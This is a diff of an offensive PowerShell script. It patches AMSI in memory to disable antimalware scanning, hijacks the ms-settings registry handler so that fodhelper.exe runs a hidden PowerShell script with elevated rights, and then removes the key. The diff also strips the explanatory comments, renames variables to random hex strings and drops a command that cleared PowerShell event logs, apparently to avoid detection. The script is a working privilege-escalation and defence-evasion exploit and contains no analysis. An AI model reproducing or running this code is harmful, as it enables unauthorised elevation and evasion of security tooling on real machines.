@@ -1,6 +1,4 @@
-# LPE abusing fodhelper.exe
 
-# amsi bypass
 $64d1eab2022445c8add9ddb98b4b3f3d = @"
 using System;
 using System.Runtime.InteropServices;
@@ -23,20 +21,18 @@ $7859efa123b54e78ac59f7dd2d03d18f = 0
 
 $de2316b8afef4af3aca39b4bdc42f0c7 = [Byte[]](0x31, 0xC0, 0xC3)
 [System.Runtime.InteropServices.Marshal]::Copy($de2316b8afef4af3aca39b4bdc42f0c7, 0, $cc145a30c76d4f6b892c6df7a1df7429, 3)
-# reg key obfuscation
-$e1651213d74c48c7b9485b28c9862b73 = "HKCU:\Software\Classes\{0}\shell\open\command" -f ('ms-settings')
-$c0cb8019ac3f4037b4759730b58ea6ee = "cmd /c start /min powershell -ep bypass -file C:\Users\thierry\Desktop\psehjwad\test_elevation.ps1" 
 
-New-Item $e1651213d74c48c7b9485b28c9862b73 -Force | Out-Null
-Set-ItemProperty $e1651213d74c48c7b9485b28c9862b73 -Name "DelegateExecute" -Value ""
-Set-ItemProperty $e1651213d74c48c7b9485b28c9862b73 -Name "(Default)" -Value $c0cb8019ac3f4037b4759730b58ea6ee
 
-# fodhelper exploit with no detection (i think so)
+$54acb7758fdc49e8bfc673a81c777705 = "HKCU:\Software\Classes\{0}\shell\open\command" -f ('ms-settings')
+$20e5651b3f694af9b491ee05df4ac648 = "cmd /c start /min powershell -ep bypass -file C:\Users\thierry\Desktop\psehjwad\test_elevation.ps1"
+
+New-Item $54acb7758fdc49e8bfc673a81c777705 -Force | Out-Null
+Set-ItemProperty $54acb7758fdc49e8bfc673a81c777705 -Name "DelegateExecute" -Value ""
+Set-ItemProperty $54acb7758fdc49e8bfc673a81c777705 -Name "(Default)" -Value $20e5651b3f694af9b491ee05df4ac648
+
+
 Start-Process "cmd.exe" -ArgumentList "/c start fodhelper.exe" -WindowStyle Hidden
 
 
 Start-Sleep 3
-Remove-Item $e1651213d74c48c7b9485b28c9862b73 -Force -Recurse -ErrorAction SilentlyContinue
-
-# hide logs
-wevtutil cl "Microsoft-Windows-PowerShell/Operational"
+Remove-Item $54acb7758fdc49e8bfc673a81c777705 -Force -Recurse -ErrorAction SilentlyContinue
